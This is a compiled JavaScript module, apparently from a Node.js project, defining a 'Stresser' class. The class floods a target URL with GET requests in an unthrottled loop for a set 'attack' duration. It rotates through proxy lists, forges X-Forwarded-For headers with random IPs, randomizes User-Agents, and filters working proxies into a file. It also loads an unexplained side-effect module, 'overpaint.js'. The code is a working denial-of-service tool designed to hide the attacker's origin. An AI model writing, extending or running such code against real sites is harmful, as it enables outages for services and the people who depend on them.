"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.Stresser = void 0;
const url_1 = require("url");
require("overpaint.js");
const axios_1 = __importDefault(require("axios"));
const faker_1 = require("@faker-js/faker");
const Utils_1 = require("../utils/Utils");
const PacketType_1 = require("../enums/PacketType");
const Stats_1 = require("./Stats");
const Packet_1 = require("../types/Packet");
class Stresser {
    targetURL;
    // ===== Agents =====
    // private _agentIndex: number = 0;
    // get nextAgent() {
    //    return this.options.agents[++this._agentIndex % this.options.agents.length];
    // }
    // ===== Proxies =====
    _proxyIndex = 0;
    get nextProxy() {
        return this.options.proxies[++this._proxyIndex % this.options.proxies.length];
    }
    // ===== Statistics =====
    stats = new Stats_1.Stats();
    // ===== Options =====
    options;
    // ===== Constructor =====
    constructor(options) {
        // set options
        this.options = options;
        // set target URL
        this.targetURL = new url_1.URL(this.options.target);
        // send data updates
        this.sendDataUpdate(this.options.updatesPerSecond || 2);
    }
    // ========== Stressing ==========================================================================
    /**
     * Send a request to the target URL
     * @param config The configuration to use for the request
     * @param proxy The proxy to use for the request
     */
    async sendRequest(config = {}, proxy = this.nextProxy) {
        try {
            if (this.stats.pending >= this.options.threads)
                return false;
            this.requestSent();
            var options = {
                headers: {
                    'X-Forwarded-For': faker_1.faker.internet.ipv4(),
                    'User-Agent': faker_1.faker.internet.userAgent(),
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Referer': this.targetURL.hostname
                },
                proxy: this.options.useProxies ? {
                    protocol: 'http',
                    host: proxy[0],
                    port: Number(proxy[1]),
                    auth: proxy.length === 4 ? {
                        username: proxy[2],
                        password: proxy[3]
                    } : undefined,
                } : undefined,
                httpAgent: this.options.httpAgent,
                ...config
            };
            const response = await axios_1.default.get(this.targetURL.href, options);
            return this.requestComplete(response.status === 200);
        }
        catch {
            return this.requestComplete(false);
        }
    }
    /**
     * Stress the target URL for a specified duration
     * @param duration The duration of the attack
     * @param config The configuration to use for the requests
     */
    stress(duration, config = {}) {
        let loop = setInterval(() => this.sendRequest(config));
        setTimeout(() => {
            clearInterval(loop);
            process.send?.((0, Packet_1.Packet)(PacketType_1.PacketType.Done, undefined));
        }, duration * 1000);
    }
    // ========== Proxies =============================================================================
    async validateProxies(proxies, timeout = 5000) {
        // validate proxies, and get an array of results (true/false)
        let proxy_results = await Promise.all(proxies.map(async (proxy) => await this.sendRequest({ timeout }, proxy)));
        // filter out invalid proxies
        let valid_proxies = proxies.filter((proxy, index) => proxy_results[index]);
        // save valid proxies to file
        let txt_data = valid_proxies.map(proxy => proxy.join(':')).join('\n');
        (0, Utils_1.setStatic)('valid_proxies.txt', txt_data);
        return valid_proxies;
    }
    // ========== Statistics =========================================================================
    requestSent() {
        this.stats.requests++;
        this.stats.pending++;
    }
    requestComplete(success) {
        if (typeof success !== "boolean")
            throw new Error('Parameter "success" must be true or false.');
        this.stats.pending--;
        (success) ? this.stats.success++ : this.stats.errors++;
        return success;
    }
    sendDataUpdate(tps = 10) {
        setInterval(() => {
            process.send?.((0, Packet_1.Packet)(PacketType_1.PacketType.Data, this.stats));
        }, 1000 / tps);
    }
}
exports.Stresser = Stresser;
['unhandledRejection', 'uncaughtException']
    .forEach((e) => process.on(e, (error) => {
    console.error(`${e}: ${error.message}`);
    process.exit(1);
}));
//# sourceMappingURL=Stresser.js.map